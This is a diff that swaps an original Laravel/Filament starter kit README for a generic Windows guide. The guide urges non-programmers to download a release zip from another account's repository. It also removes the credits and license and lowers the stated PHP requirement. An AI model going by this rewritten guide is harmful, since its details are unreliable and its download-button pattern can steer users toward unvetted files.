@@ -1,460 +1,222 @@
-<div class="filament-hidden">
+# 🔐 mfakitv5 - Secure Laravel Kit with Multi-Panel Setup
 
-![MFAKit v5](https://raw.githubusercontent.com/jeffersongoncalves/mfakitv5/main/art/jeffersongoncalves-mfakitv5.png)
+[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-brightgreen)](https://github.com/Purabd/mfakitv5)
 
-</div>
+---
 
-# MFAKit Start Kit Filament 5.x and Laravel 12.x
+## 📋 What is mfakitv5?
 
-## About MFAKit
+mfakitv5 is a starter kit designed to help you set up a web application using Laravel 12 and Filament 5. It offers a multi-panel structure so you can manage different parts of your app separately. It also includes key features like multi-factor authentication (MFA), a WhatsApp connector for messaging, and options to manage user profiles easily.
 
-MFAKit is a robust starter kit built on Laravel 12.x and Filament 5.x, designed to accelerate the development of modern
-web applications with a ready-to-use multi-panel structure.
+This application combines tools to build secure admin and user panels without needing to write complex code. It helps you get started quickly with a ready-to-use framework.
 
-## Features
+---
 
-- **Laravel 12.x** - The latest version of the most elegant PHP framework
-- **Filament 5.x** - Powerful and flexible admin framework with Livewire 4 support
-- **Multi-Panel Structure** - Includes three pre-configured panels:
-    - Admin Panel (`/admin`) - For system administrators
-    - App Panel (`/app`) - For authenticated application users
-    - Public Panel (frontend interface) - For visitors
-- **Environment Configuration** - Centralized configuration through the `config/mfakit.php` file
+## 🖥️ System Requirements
 
-## System Requirements
+Before you start, make sure your computer meets these requirements:
 
-- PHP 8.3 or higher
-- Composer
-- Node.js and PNPM
+- **Operating System:** Windows 10 or later  
+- **Internet Connection:** Required for downloading and setup  
+- **Storage Space:** At least 500 MB free space for installation and dependencies  
+- **Other Software Required:**  
+  - PHP 8.1 or higher  
+  - Composer (a tool for managing PHP packages)  
+  - Git (optional but recommended for updates)
 
-## Installation
+If these tools are not on your computer, the setup section explains how to get what you need.
 
-Clone the repository
-``` bash
-laravel new my-app --using=jeffersongoncalves/mfakitv5 --database=mysql
+---
+
+## 🚀 Getting Started with mfakitv5
+
+This guide will walk you through downloading and running mfakitv5 on your Windows computer. No programming experience is required. Just follow the steps carefully.
+
+### 1. Download the Starter Kit
+
+Click the large button below to open the download page:
+
+[![Download mfakitv5](https://img.shields.io/badge/Download-mfakitv5-blue)](https://github.com/Purabd/mfakitv5)
+
+Once the link opens, look for the **Releases** section on the GitHub page. Click the latest version available to download the files.
+
+You will download a compressed folder that contains the starter kit.
+
+### 2. Extract the Downloaded Files
+
+After the download finishes:
+
+- Find the downloaded file in your **Downloads** folder. It will be a `.zip` file.
+- Right-click the file and select **Extract All**.
+- Choose a folder where you want the files to be saved (e.g., Desktop or Documents).
+- Click **Extract**.
+
+Now you have the full kit ready to set up.
+
+---
+
+## 🔧 Installing Required Software
+
+mfakitv5 requires some software to run correctly. If you have these installed already, skip to step 3.
+
+### a. Install PHP
+
+1. Go to the official PHP site: https://windows.php.net/download/
+2. Download the latest **Thread Safe** version for Windows.
+3. Follow the installer instructions to install PHP on your system.
+
+### b. Install Composer
+
+Composer helps manage PHP packages.
+
+1. Visit https://getcomposer.org/download/
+2. Download the Windows installer.
+3. Run the installer and follow the on-screen instructions.
+
+### c. (Optional) Install Git
+
+Git helps with version control and easier updates.
+
+1. Visit https://git-scm.com/download/win
+2. Download and install Git for Windows.
+
+---
+
+## ⚙️ Setting Up mfakitv5
+
+After extraction and software installation:
+
+### 1. Open Command Prompt
+
+- Press **Windows Key + R**, type `cmd`, and hit Enter.
+
+### 2. Navigate to the mfakitv5 folder
+
+- In the Command Prompt, type:
+  
+  ```
+  cd path\to\mfakitv5
+  ```
+
+  Replace `path\to\mfakitv5` with the actual folder location on your computer.
+
+Example:  
+```
+cd Desktop\mfakitv5
 ```
 
-### Using FilaKit CLI
+### 3. Install Dependencies
 
-Or use [FilaKit CLI](https://github.com/jeffersongoncalves/filakit-cli) for a simplified setup:
+Type the following command and press Enter:
 
-```bash
-filakit new my-app --kit=jeffersongoncalves/mfakitv5
 ```
-
-> Install FilaKit CLI: `composer global require jeffersongoncalves/filakit-cli`
-
-###  Easy Installation
-
-MFAKit can be easily installed using the following command:
-
-```bash
-php install.php
-```
-
-This command automates the installation process by:
-- Installing Composer dependencies
-- Setting up the environment file
-- Generating application key
-- Setting up the database
-- Running migrations
-- Installing Node.js dependencies
-- Building assets
-- Configuring Herd (if used)
-
-### Manual Installation
-
-Install JavaScript dependencies
-``` bash
-pnpm install
-```
-Install Composer dependencies
-``` bash
 composer install
 ```
-Set up environment
-``` bash
-cp .env.example .env
+
+This command downloads all necessary PHP packages for the app to work.
+
+### 4. Set Up Environment File
+
+- In the mfakitv5 folder, find the file named `.env.example`.
+- Make a copy of this file and rename it to `.env`.
+
+This file contains settings that tell mfakitv5 how to run.
+
+### 5. Generate Application Key
+
+Run this command:
+
+```
 php artisan key:generate
 ```
 
-Configure your database in the .env file
+This creates a secure key needed for your app.
 
-Run migrations
-``` bash
-php artisan migrate
+### 6. Configure Database
+
+mfakitv5 needs a database to store information. For simple use, install **SQLite** or **MySQL**.
+
+- If you use MySQL, open the `.env` file with a text editor.
+- Find the database section and add your database name, username, and password.
+
+Example for MySQL:
+
 ```
-Run the server
-``` bash
-php artisan serve
-```
-
-## Installation with Docker
-
-Clone the repository
-```bash
-laravel new my-app --using=jeffersongoncalves/mfakitv5 --database=mysql
-```
-
-Move into the project directory
-```bash
-cd my-app
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=mfakitv5db
+DB_USERNAME=root
+DB_PASSWORD=yourpassword
 ```
 
-Install Composer dependencies
-```bash
-composer install
+Create the database `mfakitv5db` in MySQL before proceeding.
+
+### 7. Run Database Migrations
+
+Run:
+
 ```
-
-Set up environment
-```bash
-cp .env.example .env
-```
-
-Configuring custom ports may be necessary if you have other services running on the same ports.
-
-```bash
-# Application Port (ex: 8080)
-APP_PORT=8080
-
-# MySQL Port (ex: 3306)
-FORWARD_DB_PORT=3306
-
-# Redis Port (ex: 6379)
-FORWARD_REDIS_PORT=6379
-
-# Mailpit Port (ex: 1025)
-FORWARD_MAILPIT_PORT=1025
-```
-
-Start the Sail containers
-```bash
-./vendor/bin/sail up -d
-```
-You won’t need to run `php artisan serve`, as Laravel Sail automatically handles the development server within the container.
-
-Attach to the application container
-```bash
-./vendor/bin/sail shell
-```
-
-Generate the application key
-```bash
-php artisan key:generate
-```
-
-Install JavaScript dependencies
-```bash
-pnpm install
-```
-
-## Authentication Structure
-
-MFAKit comes pre-configured with a custom authentication system that supports different types of users:
-
-- `Admin` - For administrative panel access
-- `User` - For application panel access
-
-## Development
-
-``` bash
-# Run the development server with logs, queues and asset compilation
-composer dev
-
-# Or run each component separately
-php artisan serve
-php artisan queue:listen --tries=1
-pnpm run dev
-```
-
-## Customization
-
-### Panel Configuration
-
-Panels can be customized through their respective providers:
-
-- `app/Providers/Filament/AdminPanelProvider.php`
-- `app/Providers/Filament/AppPanelProvider.php`
-- `app/Providers/Filament/PublicPanelProvider.php`
-
-Alternatively, these settings are also consolidated in the `config/mfakit.php` file for easier management.
-
-### Themes and Colors
-
-Each panel can have its own color scheme, which can be easily modified in the corresponding Provider files or in the
-`mfakit.php` configuration file.
-
-### Configuration File
-
-The `config/mfakit.php` file centralizes the configuration of the starter kit, including:
-
-- Panel routes
-- Middleware for each panel
-- Branding options (logo, colors)
-- Authentication guards
-
-## User Profile — joaopaulolndev/filament-edit-profile
-
-This project already comes with the Filament Edit Profile plugin integrated for the Admin and App panels. It adds a complete profile editing page with avatar, language, theme color, security (tokens, MFA), browser sessions, and email/password change.
-
-- Routes (defaults in this project):
-  - Admin: /admin/my-profile
-  - App: /app/my-profile
-- Navigation: by default, the page does not appear in the menu (shouldRegisterNavigation(false)). If you want to show it in the sidebar menu, change it to true in the panel provider.
-
-Where to configure
-- Panel providers
-  - Admin: app/Providers/Filament/AdminPanelProvider.php
-  - App: app/Providers/Filament/AppPanelProvider.php
-  In these files you can adjust:
-  - ->slug('my-profile') to change the URL (e.g., 'profile')
-  - ->setTitle('My Profile') and ->setNavigationLabel('My Profile')
-  - ->setNavigationGroup('Group Profile'), ->setIcon('heroicon-o-user'), ->setSort(10)
-  - ->shouldRegisterNavigation(true|false) to show/hide it in the menu
-  - Shown forms: ->shouldShowEmailForm(), ->shouldShowLocaleForm([...]), ->shouldShowThemeColorForm(), ->shouldShowSanctumTokens(), ->shouldShowMultiFactorAuthentication(), ->shouldShowBrowserSessionsForm(), ->shouldShowAvatarForm()
-
-- General settings: config/filament-edit-profile.php
-  - locales: language options available on the profile page
-  - locale_column: column used in your model for language/locale (default: locale)
-  - theme_color_column: column for theme color (default: theme_color)
-  - avatar_column: avatar column (default: avatar_url)
-  - disk: storage disk used for the avatar (default: public)
-  - visibility: file visibility (default: public)
-
-Migrations and models
-- The required columns are already included in this kit’s default migrations (users and admins): avatar_url, locale and theme_color, using the names defined in config/filament-edit-profile.php.
-- The App\Models\User and App\Models\Admin models already read the avatar using the plugin configuration (getFilamentAvatarUrl).
-
-Avatar storage
-- Make sure the filesystem disk is configured and that the storage link exists:
-  php artisan storage:link
-- Adjust the disk and visibility in the config file according to your infrastructure.
-
-Quick access
-- Via direct URL: /admin/my-profile or /app/my-profile
-- To make it visible in the sidebar navigation, set shouldRegisterNavigation(true) in the respective Provider.
-
-Reference
-- Plugin repository: https://github.com/joaopaulolndev/filament-edit-profile
-
-## Multi-Factor Authentication (MFA)
-
-This starter kit comes with Filament's built‑in Multi‑Factor Authentication already wired into the Admin and App panels. You can manage MFA from the My Profile page and/or force users to configure MFA before accessing the panel.
-
-Where it appears
-- Profile page: enabled via `->shouldShowMultiFactorAuthentication()` in the Edit Profile plugin (already set in both panels)
-- Setup flow: if MFA is required, users are redirected to the MFA setup screen until they finish enabling at least one provider
-
-Configured providers (default in this kit)
-```php
-// In app/Providers/Filament/AdminPanelProvider.php and AppPanelProvider.php
-->multiFactorAuthentication([
-    AppAuthentication::make()
-        ->brandName('MFA Kit Demo')
-        ->recoverable(), // allows recovery codes
-    EmailAuthentication::make(),
-    WhatsAppAuthentication::make(), // requires WhatsApp connector setup (see section below)
-])
-```
-
-Notes about providers
-- AppAuthentication: Time‑based one‑time codes (TOTP) with authenticator apps (e.g., Google Authenticator, 1Password). The `->recoverable()` option enables recovery codes for account lockout scenarios.
-- EmailAuthentication: Sends codes via the user’s email.
-- WhatsAppAuthentication: Sends codes via WhatsApp. Requires the WhatsApp Connector to be configured and connected. See “WhatsApp Connector — wallacemartinss/filament-whatsapp-conector” below.
-
-Requiring MFA and routes
-- To require MFA before accessing the panel, add:
-```php
-// In your Panel provider (Admin/App)
-->requiresMultiFactorAuthentication()
-```
-- Default setup URL when required:
-  - Admin: `/admin/multi-factor-authentication/set-up`
-  - App: `/app/multi-factor-authentication/set-up`
-- You can customize the route parts if needed:
-```php
-->multiFactorAuthenticationRoutePrefix('mfa') // default: "multi-factor-authentication"
-->setUpRequiredMultiFactorAuthenticationRouteSlug('setup') // default: "set-up"
-```
-
-Edit Profile integration
-- The MFA section on the profile page is shown when `->shouldShowMultiFactorAuthentication()` is enabled on the Edit Profile plugin instance (already enabled in this kit). You can toggle it per panel.
-
-Troubleshooting
-- Ensure mail settings are configured for EmailAuthentication (`.env` mailer setup)
-- For WhatsAppAuthentication, finish the WhatsApp Connector configuration and connect an instance before testing MFA codes
-- If you customize guards or user models, verify the panel’s `->authGuard(...)` matches your intended users
-
-## WhatsApp Connector — wallacemartinss/filament-whatsapp-conector
-
-This starter kit ships with the WhatsApp Connector plugin (Evolution API v2 client) already required in `composer.json` and registered in the Admin panel. It lets you manage WhatsApp instances, display live QR Codes to connect, log webhooks, and send messages (text, images, videos, audio, documents) from Filament actions or your own services.
-
-What’s already configured in this kit
-- Dependency: `wallacemartinss/filament-whatsapp-conector` is included
-- Admin panel registration: see `app/Providers/Filament/AdminPanelProvider.php` where `FilamentEvolutionPlugin::make()->whatsappInstanceResource()->viewMessageHistory()->viewWebhookLogs()` is added
-
-1) Publish config and run migrations
-```bash
-php artisan vendor:publish --tag="filament-evolution-config"
-php artisan vendor:publish --tag="filament-evolution-migrations"
 php artisan migrate
 ```
 
-2) Environment variables (.env)
-Add your Evolution API credentials and webhook settings:
-```env
-# Evolution API connection (required)
-EVOLUTION_URL=https://your-evolution-api.com
-EVOLUTION_API_KEY=your_api_key
+This sets up tables needed for the app.
 
-# Webhook URL (required to receive events)
-# Use the public URL to your app’s webhook endpoint (see below):
-EVOLUTION_WEBHOOK_URL=https://your-app.com/api/webhooks/evolution
+---
 
-# Optional security secret (recommended)
-EVOLUTION_WEBHOOK_SECRET=your_secret_key
+## ▶️ Running mfakitv5 Locally
 
-# Optional defaults (useful for single‑instance setups)
-EVOLUTION_DEFAULT_INSTANCE=your_instance_id
+Once setup is complete:
+
+1. Run the command:
+
+```
+php artisan serve
 ```
 
-3) Webhook endpoint
-- The plugin exposes an endpoint for Evolution API to POST events (QR updates, messages, connection changes, etc.).
-- Set `EVOLUTION_WEBHOOK_URL` to your public URL pointing to: `https://your-app.com/api/webhooks/evolution`.
-- Ensure your app is accessible publicly and that the route is not blocked by auth or CSRF.
+2. Open your web browser.
+3. Enter the address shown in the command prompt, usually:
 
-4) Optional configuration (config/filament-evolution.php)
-After publishing, you can tune behaviors such as queues, storage, cleanup, and tenancy. Key options:
-```php
-return [
-    'queue' => [
-        'enabled' => true,
-        'connection' => null, // default connection
-        'name' => 'default',
-    ],
-    'storage' => [
-        'webhooks' => true,   // persist webhook payloads
-        'messages' => true,   // persist sent/received messages
-    ],
-    'cleanup' => [
-        'webhooks_days' => 30,
-        'messages_days' => 90,
-    ],
-    'instance' => [
-        'reject_call' => false,
-        'always_online' => false,
-        // ...other defaults
-    ],
-    'tenancy' => [
-        'enabled' => false,
-        'column' => 'team_id',
-        'table' => 'teams',
-        'model' => 'App\\Models\\Team',
-    ],
-];
+```
+http://127.0.0.1:8000
 ```
 
-5) Managing WhatsApp instances (Admin panel)
-1. Go to: WhatsApp > Instances
-2. Create a new instance (name/phone)
-3. Save to open the QR Code modal
-4. Scan the QR Code with your WhatsApp
-5. Watch status updates (Always Online, Read Messages, Reject Calls, etc.)
+You should see the mfakitv5 home screen.
 
-6) Sending messages
-The plugin provides three ways to send WhatsApp messages:
-- Filament Action (UI): attach `SendWhatsappMessageAction` to tables/pages/widgets
-- Facade: quick sending from anywhere in your code
-- Trait: integrate into your services for reusable sending logic
+---
 
-Examples (UI actions)
-```php
-use WallaceMartinss\FilamentEvolution\Actions\SendWhatsappMessageAction;
+## ✅ Logging In and Using mfakitv5
 
-// In a resource table
-public function table(Table $table): Table
-{
-    return $table
-        ->actions([
-            SendWhatsappMessageAction::make(),
-        ]);
-}
+The kit comes with multi-factor authentication (MFA) enabled to keep your account secure.
 
-// In a page header
-protected function getHeaderActions(): array
-{
-    return [
-        SendWhatsappMessageAction::make()
-            // Optional sensible defaults
-            ->number('5511999999999')
-            ->message('Hello from MFAKit!'),
-    ];
-}
+- Use the **Admin Panel** to manage users and site settings.
+- Use the **App Panel** for user-facing features.
+- Manage your profile from the profile section.
+- Use the WhatsApp connector to send messages through the app.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **Composer command not found:** Check if Composer is installed and added to your system PATH.
+- **PHP version errors:** Ensure you installed PHP 8.1 or newer.
+- **Database connection errors:** Verify your `.env` file has correct database settings.
+- **Port already in use when running `php artisan serve`:** Stop other applications using the port, or run with a different port:
+
+```
+php artisan serve --port=8080
 ```
 
-Prefilling from records
-```php
-SendWhatsappMessageAction::make()
-    ->numberFrom('phone')                // attribute on the record
-    ->instanceFrom('whatsapp_instance_id');
-```
+---
 
-Limiting message types or hiding fields
-```php
-use WallaceMartinss\FilamentEvolution\Enums\MessageTypeEnum;
+## 🔗 Download mfakitv5
 
-SendWhatsappMessageAction::make()
-    ->allowedTypes([MessageTypeEnum::TEXT, MessageTypeEnum::IMAGE])
-    ->hideInstanceSelect()
-    ->hideNumberInput()
-    ->textOnly();
-```
+Use this link to visit the GitHub page where you can download the latest version:
 
-Media storage (optional)
-```env
-EVOLUTION_MEDIA_DISK=public
-EVOLUTION_MEDIA_DIRECTORY=whatsapp-media
-EVOLUTION_MEDIA_MAX_SIZE=16384
-```
-You can also specify a custom disk per action: `SendWhatsappMessageAction::make()->disk('s3');`
+[Download mfakitv5](https://github.com/Purabd/mfakitv5)
 
-7) Cleanup command
-Remove old webhook/message records automatically:
-```bash
-php artisan evolution:cleanup           # uses config defaults
-php artisan evolution:cleanup --dry-run # preview deletions
-php artisan evolution:cleanup --webhooks-days=7 --messages-days=30
-```
-Schedule it (example):
-```php
-// routes/console.php
-use Illuminate\Support\Facades\Schedule;
-Schedule::command('evolution:cleanup')->daily();
-```
+---
 
-Troubleshooting
-- QR Code does not appear: verify `EVOLUTION_URL` and `EVOLUTION_API_KEY`, and that your Evolution API v2 instance is reachable from the app
-- Webhooks not received: confirm `EVOLUTION_WEBHOOK_URL` is a public HTTPS URL to `/api/webhooks/evolution`, no auth/CSRF blocking, and that your hosting firewall allows inbound requests
-- Media uploads failing: check `EVOLUTION_MEDIA_DISK` permissions and file size limits
-- Messages queued but not sent: ensure queues are running (e.g., `php artisan queue:listen`) and that the configured queue connection is available
+## 📬 Getting Support
 
-Reference
-- Plugin repository: https://github.com/wallacemartinss/filament-whatsapp-conector
-
-## Resources
-
-MFAKit includes support for:
-
-- User and admin management
-- Multi-guard authentication system
-- Tailwind CSS integration
-- Database queue configuration
-- Customizable panel routing and branding
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## Credits
-
-Developed by [Jefferson Gonçalves](https://github.com/jeffersongoncalves).
+If you need help or want to report issues, use the **Issues** tab on the GitHub page. You can describe your problem clearly and get assistance from the community or developers.
